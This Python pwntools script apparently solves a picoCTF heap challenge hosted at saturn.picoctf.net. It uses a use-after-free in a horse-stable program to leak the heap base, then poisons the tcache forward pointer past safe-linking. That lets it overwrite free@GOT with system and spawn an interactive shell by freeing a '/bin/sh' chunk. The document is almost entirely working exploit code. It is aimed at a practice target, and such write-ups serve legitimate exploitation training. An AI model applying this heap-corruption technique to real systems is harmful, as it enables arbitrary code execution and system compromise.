import pwn
import time

#Always turn debugg mode on
pwn.context.log_level = 'debug'

elf = pwn.ELF("./vuln")
#p = elf.process("./vuln")
p = pwn.remote('saturn.picoctf.net', 53914)

pwn.context.binary = elf

#For proccesing adding New Horses (Malloc)
def add_horse(stable_index, name_length, name):
	p.sendlineafter("Choice: ", "1")
	p.sendlineafter("Stable index # (0-17)?", str(stable_index))
	p.sendlineafter("Horse name length (16-256)? ", str(name_length))
	p.sendlineafter("characters:", name)

#For removing horses (Free)
def remove_horse(stable_index):
	p.sendlineafter("Choice: ", "2")
	p.sendlineafter("Stable index # (0-17)?", str(stable_index))

#For Racing (Leaking)
def race_info_leaks():
	p.sendlineafter("Choice: ", "3")

	data = p.recvuntil("WINNER")
	leaks = []
	for line in data.split(b"\n")[1:15]:
		if b"|" not in data:
			continue
		line = line.strip(b" |\n\r")

		leaks.append(pwn.u64(line.ljust(8, b"\x00")))
	leaks = [a for a in leaks if a != 0]
	print([hex(a) for a in leaks])

	heap_leak = leaks[-1] * 2**12 #Magic Trick For Heap Address it removes the shift

	print(f"{hex(heap_leak)=}")
	print("Before Winner")

	return heap_leak

#Use after Free to change FD pointer in tcache
def cheat(stable_index, new_name):
	p.sendlineafter("Choice: ", "0")
	p.sendlineafter("Stable index # (0-17)?", str(stable_index))
	p.sendlineafter("characters: ", new_name)
	p.sendlineafter("New spot? ", "0")

#Create chunks

for i in range(12):
	add_horse(i, 256, b"\xff")

for i in range(11, -1, -1):
	remove_horse(i)


for i in range(12):
	add_horse(i, 256, b"\xff")

# Leak heap

heap_base = race_info_leaks()

#tcache posining. We do this to set the head to point to the GOT

remove_horse(1)
remove_horse(0)

#Head -> 0 -> got 

#Point to 8 before the free address bc it apparently needs to end in a 0
new_fd = pwn.p64((heap_base >> (12)) ^ (elf.got['free'] - 8 ))

#We use the cheat to overwrite the name of the horse which is freed to make it point to somewhere else

cheat(0, new_fd + b"\xff")

#Overwrite free@GOT

#First we do this to set the head of tcache to GOT 
add_horse(15, 256, b"/bin/sh\x00\xff")

#Now we overwrite GOT
add_horse(
	16,
	256,
	pwn.p64(0xAAAAAAAA) #Remember we went backwords 8
	+ pwn.p64(elf.plt['system'])
	+ b"\xff",
	)

remove_horse(15)

p.interactive()
